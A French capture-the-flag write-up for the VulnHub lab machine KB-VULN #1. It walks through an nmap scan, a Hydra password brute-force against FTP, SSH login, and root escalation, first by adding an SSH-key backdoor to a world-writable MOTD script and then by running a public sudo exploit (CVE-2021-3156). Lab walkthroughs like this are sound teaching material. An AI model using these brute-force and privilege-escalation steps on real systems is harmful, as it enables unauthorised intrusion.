# Solution du CTF KB-VULN #1 de VulnHub

Rapide et furieux
-----------------

Combien de temps faut-il pour résoudre un CTF ? Tout dépend bien sûr de la difficulté du challenge et des compétences du joueur.  

Pour celui-ci ([KB-VULN n°1](https://www.vulnhub.com/entry/kb-vuln-1,540/)) on est bien plus près des minutes que des heures, il n'en reste pas moins qu'on peut s'amuser (vite fait).  

```plain
Nmap scan report for 192.168.56.5
Host is up (0.00015s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.56.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 95:84:46:ae:47:21:d1:73:7d:2f:0a:66:87:98:af:d3 (RSA)
|   256 af:79:86:77:00:59:3e:ee:cf:6e:bb:bc:cb:ad:96:cc (ECDSA)
|_  256 9d:4d:2a:a1:65:d4:f2:bd:5b:25:22:ec:bc:6f:66:97 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: OneSchool — Website by Colorlib
|_http-server-header: Apache/2.4.29 (Ubuntu)
MAC Address: 08:00:27:09:6B:FC (Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Dans le FTP on trouve un fichier *.bash\_history*. Est-ce le dossier personnel d 'un utilisateur quelconque ? Dans tous les cas on ne dispose pas d'accès en écriture donc on s'arrête là.  

Une énumération de la racine web ne remonte rien mais un coup d'oeil à la source de la page d'index permet de trouver un nom d'utilisateur :  

```html
<!-- Username : sysadmin -->
```

Aussitôt dit, aussitôt cracké :  

```plain
$ ./hydra -l sysadmin -P rockyou.txt -e nsr ftp://192.168.56.5
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344407 login tries (l:1/p:14344407), ~896526 tries per task
[DATA] attacking ftp://192.168.56.5:21/
[21][ftp] host: 192.168.56.5   login: sysadmin   password: password1
1 of 1 target successfully completed, 1 valid password found
```

Cet identifiant permet l'accès au FTP mais surtout au SSH où l'on retrouve un premier flag.  

```plain
sysadmin@kb-server:~$ cat user.txt 
48a365b4ce1e322a55ae9017f3daf0c0
```

Cet utilisateur fait partie des groupes sudo et lxd :  

```plain
uid=1000(sysadmin) gid=1000(sysadmin) groups=1000(sysadmin),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

Un petit coup de LinPEAS indique que le fichier */etc/update-motd.d/00-header* appartenant à root mais est word-writable.  

D'après [la page de manuel](https://manpages.ubuntu.com/manpages/bionic/man5/update-motd.5.html) :  

```plain
Executable scripts in /etc/update-motd.d/* are executed by pam_motd(8) as the root user at
each  login,  and  this  information  is  concatenated in /run/motd.dynamic.
```

Le script actuel est le suivant :  

```bash
#!/bin/sh
#
#    00-header - create the header of the MOTD
#    Copyright (C) 2009-2010 Canonical Ltd.
#
#    Authors: Dustin Kirkland <kirkland@canonical.com>
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

[ -r /etc/lsb-release ] && . /etc/lsb-release

echo "\n\t\t\tWELCOME TO THE KB-SERVER\n"
```

Je rajoute ces lignes :

```bash
echo $(id)
mkdir -p /root/.ssh
echo 'ssh-rsa --ma-cle-publique-ssh--' > /root/.ssh/authorized_keys
```

Et effectivement si je me reconnecte :  

```plain
$ ssh sysadmin@192.168.56.5
sysadmin@192.168.56.5's password: 

                        WELCOME TO THE KB-SERVER

uid=0(root) gid=0(root) groups=0(root)
```

Ce qui prouve que le script a été exécuté en root et que je me suis rajouté un accès.  

```plain
root@kb-server:~# cat flag.txt 
1eedddf9fff436e6648b5e51cb0d2ec7
```

On peut aussi obtenir l'accès root via [l'exploit pour sudo](https://github.com/worawit/CVE-2021-3156) utilisé sur le précédent CTF (Fawkes) :  

```plain
sysadmin@kb-server:~/CVE-2021-3156-main$ python3 exploit_nss.py
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),1000(sysadmin)
```


*Published December 07 2021 at 21:51*